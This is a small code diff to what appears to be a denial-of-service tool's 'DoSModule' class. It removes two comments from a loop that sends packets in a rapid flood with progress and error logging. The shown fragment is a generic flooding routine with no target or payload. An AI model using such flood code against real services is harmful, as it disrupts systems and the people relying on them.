@@ -33,11 +33,10 @@ class DoSModule:
                 pkt = PacketBuilder.build_packet(opcode, data)
                 self.connection.send(pkt)
                 
-                # Only print periodically if NOT using rich (since track handles it)
                 if not self.console and i % 50 == 0:
                     print(f"[*] Sent {i} packets...")
                 
-                time.sleep(0.005) # Slightly faster flood
+                time.sleep(0.005)
             except Exception as e:
                 self.log(f"[red][!] Error during flood at packet {i}: {e}[/red]")
                 break
